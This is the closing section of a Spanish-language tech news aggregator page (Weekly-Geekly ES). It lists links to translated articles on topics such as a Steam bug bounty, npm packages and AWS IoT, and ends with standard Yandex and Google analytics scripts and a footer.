<li><a href="../es436128/index.html">Entrevista con el baghunter Artyom Mosc√∫. Hacke√≥ Steam y recibi√≥ el premio m√°s grande en la historia de Valve.</a></li>
<li><a href="../es436130/index.html">El proyecto del Ministerio de Telecomunicaciones y Comunicaciones Masivas para transferir tr√°fico de Internet a trav√©s de estaciones rusas complica la legalizaci√≥n de OneWeb en Rusia</a></li>
<li><a href="../es436132/index.html">12 cosas extra√±as que pueden suceder despu√©s de instalar el paquete npm</a></li>
<li><a href="../es436134/index.html">Se impondr√°n hasta un 20% de aranceles sobre los enrutadores de importaci√≥n</a></li>
<li><a href="../es436140/index.html">"Bajo el cap√≥" del almacenamiento de Huawei: tecnolog√≠as patentadas y lo que otros no tienen</a></li>
<li><a href="../es436144/index.html">Jefes chupadores de sangre en el contexto de una biocenosis: por qu√© un equipo aut√≥nomo se separa si no est√° centralizado</a></li>
<li><a href="../es436148/index.html">La historia de un junior: c√≥mo comenzar a trabajar y no tener miedo de todo</a></li>
<li><a href="../es436150/index.html">Configure la transferencia de datos del dispositivo a AWS IoT Core</a></li>
<li><a href="../es436152/index.html">El error que me ense√±√≥ el dise√±o orientado a los negocios.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>